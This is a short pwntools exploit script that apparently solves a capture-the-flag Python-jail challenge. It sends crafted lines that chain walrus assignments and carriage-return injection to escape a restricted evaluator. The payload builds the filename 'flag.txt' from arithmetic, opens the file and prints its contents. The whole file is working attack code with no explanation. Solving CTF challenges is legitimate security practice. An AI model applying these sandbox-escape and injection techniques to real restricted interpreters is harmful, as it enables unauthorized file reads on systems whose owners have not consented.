from pwn import *

#conn = process(["python3.9", "./main.py"])
conn = remote("pycorrectionalcenter.ictf.kctf.cloud", 1337)

conn.sendline(b"(m:=main)()")
conn.sendline(b"o=open\rm()")
conn.sendline(b"b=bytes\rm()")
conn.sendline(b"s=set\rm()")
conn.sendline(b"p=print\rm()")
conn.sendline(b"f=[0]\rm()")
conn.sendline(b"f+=[0]\rm()")
conn.sendline(b"f+=[0]\rm()")
conn.sendline(b"f+=[0]\rm()")
conn.sendline(b"f+=[0]\rm()")
conn.sendline(b"f+=[0]\rm()")
conn.sendline(b"f+=[0]\rm()")
conn.sendline(b"f+=[0]\rm()")
conn.sendline(b"f[0]=99\rm()")
conn.sendline(b"f[0]+=3\rm()") # f
conn.sendline(b"f[1]=99\rm()")
conn.sendline(b"f[1]+=9\rm()") # l
conn.sendline(b"f[2]=97\rm()") # a
conn.sendline(b"f[3]=99\rm()")
conn.sendline(b"f[3]+=4\rm()") # g
conn.sendline(b"f[4]=46\rm()") # .
conn.sendline(b"f[5]=99\rm()")
conn.sendline(b"f[5]+=9\rm()")
conn.sendline(b"f[5]+=8\rm()") # t
conn.sendline(b"f[6]=99\rm()")
conn.sendline(b"f[6]+=9\rm()")
conn.sendline(b"f[6]+=9\rm()")
conn.sendline(b"f[6]+=3\rm()") # x
conn.sendline(b"f[7]=99\rm()")
conn.sendline(b"f[7]+=9\rm()")
conn.sendline(b"f[7]+=8\rm()") # t
conn.sendline(b"f=b(f)\rm()")
conn.sendline(b"d=o(f)\rm()")
conn.sendline(b"p(s(d))\rm()")
conn.recvuntil(b"{'")
print(conn.recvuntil(b"}"))
